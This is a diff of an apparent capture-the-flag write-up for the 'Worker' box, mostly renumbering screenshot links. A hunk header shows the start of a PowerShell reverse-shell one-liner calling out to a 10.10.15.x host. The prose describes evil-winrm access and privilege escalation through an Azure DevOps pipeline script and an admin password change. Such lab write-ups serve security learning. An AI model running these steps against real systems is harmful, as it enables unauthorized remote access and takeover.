@@ -81,11 +81,10 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.
 
 ![](/images/2021-2-12-Worker/11.png)
 ![](/images/2021-2-12-Worker/12.png)
-![](/images/2021-2-12-Worker/13.png)
-
 So, now that we have so many different users, I tried using one to log into the devops site.
 
-![](/images/2021-2-12-Worker/14.png)
+![](/images/2021-2-12-Worker/13.png)
+
 
 Oh, wait a minute. I can use evil-winrm to read the user.txt file.
 
@@ -95,7 +94,7 @@ gem install evil-winrm
 
 then 
 
-![](/images/2021-2-12-Worker/15.png)
+![](/images/2021-2-12-Worker/14.png)
 
 Awesome !!
 
@@ -105,27 +104,34 @@ Now to privilege escalation…
 As expected, “access denied”
 
 
-![](/images/2021-2-12-Worker/16.png)
+![](/images/2021-2-12-Worker/15.png)
 
 After spending some time in the box enumerating, I got nothing so, I decided to look at the devops site..
 
 
 After spending a lot of time, I stumbled upon pipelines.
 
-![](/images/2021-2-12-Worker/17.png)
+![](/images/2021-2-12-Worker/16.png)
 
 So, I decided to create pipeline using azure..
 
 I saw a field called “script” in the YAML deployment file , so immediately change the value into reading the root.txt. Technically, this should work !!
 
-![](/images/2021-2-12-Worker/18.png)
+
+![](/images/2021-2-12-Worker/17.png)
 
 However, for some reason it didn’t, so I tried to change the admin password  
-![](/images/2021-2-12-Worker/19.png)
+
+![](/images/2021-2-12-Worker/18.png)
+
 Yikess :/  I should start using strong passwords **silly me**
-![](/images/2021-2-12-Worker/20.png)
+
+![](/images/2021-2-12-Worker/19.png)
 
 I re-did the same thing, now with a stronger password:
+
+![](/images/2021-2-12-Worker/20.png)
+
 
 W00t Wo0T
 
